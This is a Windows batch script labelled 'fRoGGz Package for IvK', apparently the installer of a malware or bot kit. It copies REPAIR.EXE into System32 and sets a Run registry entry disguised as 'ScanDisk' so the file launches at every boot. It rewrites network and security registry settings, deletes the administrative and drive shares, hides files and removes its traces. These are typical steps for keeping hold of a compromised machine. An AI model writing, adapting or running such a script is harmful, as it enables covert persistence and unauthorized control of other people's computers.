@ECHO OFF
@ECHO COLOR 4 fRoGGz Package for IvK.
DEL /F /A %windir%\SYSTEM32\DISK.CMD
COPY /Y REPAIR.EXE %windir%\SYSTEM32
ECHO REGEDIT4 > fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters] >> fRoGGz.reg
ECHO "SmbDeviceEnabled"=dword:00000000 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole] >> fRoGGz.reg
ECHO "EnableDCOM"="N" >> fRoGGz.reg
ECHO "EnableRemoteConnect"="N" >> fRoGGz.reg
ECHO "LegacyAuthentication"=dword:00000000 >> fRoGGz.reg
ECHO off >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] >> fRoGGz.reg
ECHO "limitblankpassworduse"=Dword:00000001  >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters] >> fRoGGz.reg
ECHO "AutoShareServer"=dword:00000000 >> fRoGGz.reg
ECHO "AutoShareWks"=dword:00000000  >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] >> fRoGGz.reg
ECHO "restrictanonymous"=Dword:00000002 >> fRoGGz.reg
ECHO "restrictanonymoussam"=Dword:00000001  >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] >> fRoGGz.reg
ECHO "everyoneincludesanonymous"=Dword:00000000 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcSs] >> fRoGGz.reg
ECHO "ListenOnInternet"="N" >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa] >> fRoGGz.reg
ECHO "restrictanonymous "=dword:00000001 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> fRoGGz.reg
ECHO "ScanDisk"="REPAIR DISK.CMD" >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Rpc] >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Rpc\Linkage] >> fRoGGz.reg
ECHO "Bind"=hex(7):31,00,00,00,00,00 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcSs\] >> fRoGGz.reg
ECHO "ListenOnInternet"="N" >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Ole] >> fRoGGz.reg
ECHO "EnableDCOM"="N" >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\] >> fRoGGz.reg
ECHO "EnableICMPRedirect"=dword:00000000 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\] >> fRoGGz.reg
ECHO "SynAttackProtect"=dword:00000002 >> fRoGGz.reg
ECHO "TcpMaxHalfOpen"=dword:00000100 >> fRoGGz.reg
ECHO "TcpMaxHalfOpenRetried"=dword:00000080 >> fRoGGz.reg
ECHO "TcpMaxPortExhausted"=dword:00000005 >> fRoGGz.reg
ECHO "EnableDeadGWDetect"=dword:00000000 >> fRoGGz.reg
ECHO "KeapAliveTime"=dword:00300000 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\] >> fRoGGz.reg
ECHO "NoNameReleaseOnDemand"=dword:00000001 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\AFD\Parameters\] >> fRoGGz.reg
ECHO "EnableDynamicBacklog"=dword:00000000 >> fRoGGz.reg
ECHO "MinimumDyamicBacklog"=dword:00000020 >> fRoGGz.reg
ECHO "MaximumDyamicBacklog"=dword:00020000 >> fRoGGz.reg
ECHO "DyamicBacklogGrowthDelta"=dword:00000010 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] >> fRoGGz.reg
ECHO "nolmhash"=dword:00000001 >> fRoGGz.reg
ECHO "lmcompatibilitylevel"=dword:00000005 >> fRoGGz.reg
ECHO OFF >> fRoGGz.reg
REGEDIT /S fRoGGz.reg
DEL /F /A fRoGGz.reg
CLS
ECHO @ECHO off > %WINDIR%\SYSTEM32\DISK.CMD
ECHO NET SHARE ipc$ /d /y /y >> %WINDIR%\SYSTEM32\DISK.CMD
CLS
NET SHARE admin$ /d /y /y
NET SHARE c$ /d /y /y
NET SHARE d$ /d /y /y
NET SHARE e$ /d /y /y
NET SHARE f$ /d /y /y
NET SHARE g$ /d /y /y
NET SHARE h$ /d /y /y
NET SHARE i$ /d /y /y
NET SHARE j$ /d /y /y
NET SHARE k$ /d /y /y
NET SHARE l$ /d /y /y
NET SHARE m$ /d /y /y
NET SHARE n$ /d /y /y
NET SHARE o$ /d /y /y
NET SHARE p$ /d /y /y
NET SHARE q$ /d /y /y
NET SHARE r$ /d /y /y
NET SHARE s$ /d /y /y
NET SHARE t$ /d /y /y
NET SHARE u$ /d /y /y
NET SHARE v$ /d /y /y
NET SHARE w$ /d /y /y
NET SHARE x$ /d /y /y
NET SHARE y$ /d /y /y
NET SHARE z$ /d /y /y
CLS
NET STOP Utilities
SET MXBIN=%windir%
SET MXHOME=%windir%
CD %windir%
NET SHARE ipc$ /d /y /y
ATTRIB +H SET*.*
DEL /F /A CLOSE.BAT
EXIT